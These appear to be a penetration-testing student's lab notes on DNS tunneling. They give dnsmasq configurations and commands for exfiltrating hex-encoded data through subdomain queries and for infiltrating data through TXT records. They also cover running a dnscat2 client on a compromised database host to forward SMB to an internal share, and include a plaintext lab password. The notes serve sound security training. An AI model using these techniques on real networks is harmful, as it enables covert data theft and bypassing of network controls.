---
tags: dnscat2
---
- tunnel data *indirectly* in and out of restrictive network environments

## DNS Tunneling Fundamentals

Scenario:
![[Pasted image 20240828150351.png]]
- FELINEAUTHORITY: registered within this network (or to domain registrar) as the authoritative name server for the **feline.corp** zone
- MULTISERVER03 is configured as the DNS resolver server for PGDATABASE01
- In the real world, we will have registered the feline.corp domain name ourselves, set up the authoritative name server machine ourselves, and told the domain registrar that this server should be known as the authoritative name server for the **feline.corp** zone

**Exfiltrate data** from PGDATABASE01 to our controlled server FELINEAUTHORITY using DNS subdomain query:
1. Serve a DNS server on FELINEAUTHORITY using dnsmasq
	1. Write the dnsmasq config file `dnsmasq.conf` anywhere you want
```
	# Do not read /etc/resolv.conf or /etc/hosts
	no-resolv
	no-hosts
	# Define the zone
	auth-zone=feline.corp
	auth-server=feline.corp   
```
1. 
	2. Start DNS server:
	   `sudo dnsmasq -C dnsmasq.conf -d`
		- `-C dnsmasq.conf`: specify the config file
		- `-d`: no daemon (runs in foreground, so that we can kill it easily later)
	3. Set up tcpdump to listen for DNS packets
	   `sudo tcpdump -i ens192 udp port 53` 
		- `ens192`: the interface to listen on
2. Register the **feline.corp** domain, register FELINEAUTHORITY as the authoritative name server, etc.
3. Exploit a CVE to control CONFLUENCE01 then tunnel to PGDATABASE01.
4. Make DNS query from PGDATABASE01 for "\[hex-string-chunk].feline.corp"
5. The exfiltrated hex string data will be received by FELINEAUTHORITY via the chain of DNS queries. You can check the DNS query in tcpdump

**Infiltrate data** by serving TXT record:

1. Set up config file dnsmasq_txt.conf:
```
	# Do not read /etc/resolv.conf or /etc/hosts 
	no-resolv 
	no-hosts 
	# Define the zone 
	auth-zone=feline.corp 
	auth-server=feline.corp 
	# TXT record 
	txt-record=www.feline.corp,here's something useful! 
	txt-record=www.feline.corp,here's something else less useful.
```
2. Start DNS server:
   `sudo dnsmasq -C dnsmasq_txt.conf -d`
3. On PGDATABASE01, make request for TXT records of `www.feline.corp`:
   `nslookup -type=txt www.feline.corp`

To infiltrate binary data, serve it as a series of Base64 or ASCII hex encoded TXT records, and convert it back to binary on the internal server.

## DNS Tunneling with dnscat2

Tool: [dnscat2](https://github.com/iagox86/dnscat2)
- exfiltrates data with DNS subdomain queries
- infiltrates data with TXT (and other) records
- dnscat2 server runs on an authoritative name server for a particular domain
- dnscat2 client runs on compromised machines
- Not stealthy

Steps:
1. Start dnscat2 server with feline.corp domain as the only argument:
   `dnscat2-server feline.corp`
	- `feline.corp`: the domain we are using
2. Run dnscat2 client binary on PGDATABASE01 (transfer the binary to the machine first if not already installed):
   `./dnscat feline.corp`
	- `feline.corp`: use the domain as the only argument
3. Check for connections back on our dnscat2 server:
   Should see "New window created"
4. On the dnscat2 server, list all active windows:
   `windows`
5. Select a window and list all available commands:
   `window -i 1`
   `?`
6. Background console session by pressing Ctrl+Z
7. On Kali, connect to the SMB port on HRSHARES through our DNS tunnel using the `listen` command (similar to `ssh -L`):
   `listen 127.0.0.1:4455 172.16.2.11:445`
	- `127.0.0.1:4455`: the local loopback interface
	- `172.16.2.11:445`: forwarding destination
8. From another shell on FELINEAUTHORITY, we can list the SMB shares through this port forward:
   `smbclient -p 4455 -L //127.0.0.1 -U hr_admin -- password=Welcome1234`
	- `-p 4455 -L //127.0.0.1`: connect to loopback interface



